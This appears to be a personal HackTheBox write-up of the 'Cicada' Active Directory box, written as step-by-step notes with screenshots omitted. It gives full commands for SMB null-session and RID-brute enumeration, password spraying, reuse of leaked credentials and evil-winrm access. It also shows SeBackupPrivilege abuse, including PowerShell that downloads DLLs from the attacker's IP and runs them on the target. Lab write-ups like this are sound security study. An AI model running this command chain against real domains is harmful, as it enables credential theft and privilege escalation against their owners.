Add ip address of machine to `/etc/hosts`

`nano /etc/hosts`

![[HackTheBox/Cicada/images/1.png]]

Conduct port scan ->

`sudo nmap -sV -sC cicada.htb`, 
`sudo nmap -sV -p- --max-rate 10000 cicada.htb`

Observe that I was dealing with AD structure:

![[HackTheBox/Cicada/images/9.png]]

![[HackTheBox/Cicada/images/2.png]]

Domain Controller Hostname:
`commonName=CICADA-DC.cicada.htb`

Domain:
`cicada.htb`

Plus, **Microsoft HTTPAPI** + **port 5985** combination refers to `WinRM` service.

![[HackTheBox/Cicada/images/3.png]]

Lastly, SMB ports are shown I'll try password sprays and null session.

![[HackTheBox/Cicada/images/4.png]]

Now let's enumerate `SMB` shares via null sessions:

[NetExec SMB Share Enum](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions)

`nxc smb cicada.htb -u '' -p ''`

![[HackTheBox/Cicada/images/5.png]]

I also found that a cheatsheet for `null session` enum ,yet I did not know actually about `RID` what does that mean and so on... Check from here:

[Null Enum](https://notes.benheater.com/books/active-directory/page/null-session-enumeration)

In that page there was another parameter `--rid-brute 3000` 3000 specificied as permissions that the account.

[RID explanation](https://graylog.org/post/adversary-tradecraft-a-deep-dive-into-rid-hijacking-and-hidden-users/)

![[HackTheBox/Cicada/images/6.png]]

Basically we are asking DC to who is 500,3000,1001 ? through `SMB`

I tried different combinations with `NULL session` and `Enumerate Guest`.

[Guest Logon](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon)

`nxc smb cicada.htb -u '' -p ''`
`nxc smb cicada.htb -u '' -p '' --users`
`nxc smb cicada.htb -u 'CTIS' -p '' --users`

![[HackTheBox/Cicada/images/7.png]]

I identified that `Guest` account enabled ,but Idk how to enum guest account.

`nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`

It is clear that by combination of `non existing` user and `--rid-brute` I found entire user accounts exist in the domain.

`nxc smb cicada.htb -u 'CTIS' -p '' --rid-brute`

![[HackTheBox/Cicada/images/8.png]]

This cheatsheet recommends to usage of `-u 'guest'` as well lets try

[SMB Cheatsheet](https://0xdf.gitlab.io/cheatsheets/smb-enum)

`nxc smb cicada.htb -u 'guest' -p '' --shares`

![[HackTheBox/Cicada/images/10.png]]

Thanks to `HR` department share I can read belonging contents.

I used `netexec` spider modules to fuzz contents of shares:

[Spider Module](https://www.netexec.wiki/smb-protocol/spidering-shares)

`nxc smb cicada.htb -u 'guest' -p '' -M spider_plus`

![[HackTheBox/Cicada/images/11.png]]

I discovered `.txt` file belonging to HR:

```bash
{
    "HR": {
        "Notice from HR.txt": {
            "atime_epoch": "2024-08-28 20:31:48",
            "ctime_epoch": "2024-03-14 15:29:03",
            "mtime_epoch": "2024-08-28 20:31:48",
            "size": "1.24 KB"
        }
    }
}    
```

I cannot authenticate `SMB` through `guest` user account ,so also I used random non-existing string to authenticate HR share:

![[12.png]]

`smbclient //10.129.231.149/HR -U 'CTIS' -N`

`ls -> get "Notice from HR.txt"`

![[13.png]]

As we found AD user accounts, lets try to brute them via `password spraying` technique. In real world test, I never seen such RID thing instead we try to guess most suitable ones.

![[14.png]]

I created my user files as below:

john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

[Pass Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)

Succeed as `michael` account:

![[15.png]]

With also `--continue-on-success` param:

![[16.png]]

I never have a methodology ,but simply dive into `ldap search`

netexec also provides `ldap` option:

[Nxc LDAP Protocol](https://www.netexec.wiki/ldap-protocol/authentication)

`nxc ldap cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

![[17.png]]

david leaks his password in `Description` field.

`david.orelious:aRt$Lp#7t*VQ!3`

`nxc ldap cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --users`

Let's find anything valuable on `SMB` for david:

`nxc smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`

![[18.png]]

Observe. that david's account can `READ` dev share. Now I will auth as david to shares via `smbclient`

`smbclient //10.129.231.149/DEV -U 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`

I found powershell script in David's share:

![[19.png]]

Emily user's hardcoded credentials can be observable

![[20.png]]

`nxc smb cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares`

Emily is a high privileged account just an assumption based on `READ,WRITE` perms on Disk access (C$) and admin share read utilities:

![[21.png]]

I will access through WINRm protocol instead of SMB

`smbclient //10.129.231.149/ADMIN$ -U 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

![[22.png]]

Use Hackviser's guide:

[EvilWinRM](https://hackviser.com/tactics/pentesting/services/winrm)

`evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

Get user flag from Emily's `Desktop`:

![[23.png]]

Ask Domain Controller to AD profile of user.

`net user emily.oscars /domain`

![[24.png]]

Notice that user has `Backup Operators` tag most likely highly privileged account.

![[25.png]]

I will shift tokens directly.

![[26.png]]

Backup privilege available on target:

I will follow description in below:

[SeBackupPrivilege](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)

![[27.png]]

![[31.png]]

I tried `Acl-FullControl` powershell ,but still did not work properly.

![[28.png]]

![[29.png]]

Now I applied:

```bash
1. Import necessary libraries:

`Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll`

2. Enable and verify `SeBackupPrivilege`:

`Set-SeBackupPrivilege Get-SeBackupPrivilege`

3. Access and copy files from restricted directories, for instance:

`dir C:\Users\Administrator\ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite`
```

For `SeBackupPrivilegeUtils.dll`:

```bash
$URL = “http://10.10.16.64:1000/SeBackupPrivilegeUtils.dll”
$Path=”C:\Users\emily.oscars.CICADA\backuputils.dll”
Invoke-WebRequest -URI $URL -OutFile $Path
```

For `SeBackupPrivilegeCmdLets.dll`:

```bash
$URL = “http://10.10.16.64:1000/SeBackupPrivilegeCmdLets.dll”
$Path=”C:\Users\emily.oscars.CICADA\backupcmdlets.dll”
Invoke-WebRequest -URI $URL -OutFile $Path
```

![[30.png]]

Import modules and set privileges

Then copy restricted file to unrestricted zone:

`Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\root.txt -Overwrite`

Finally get root flag:

![[32.png]]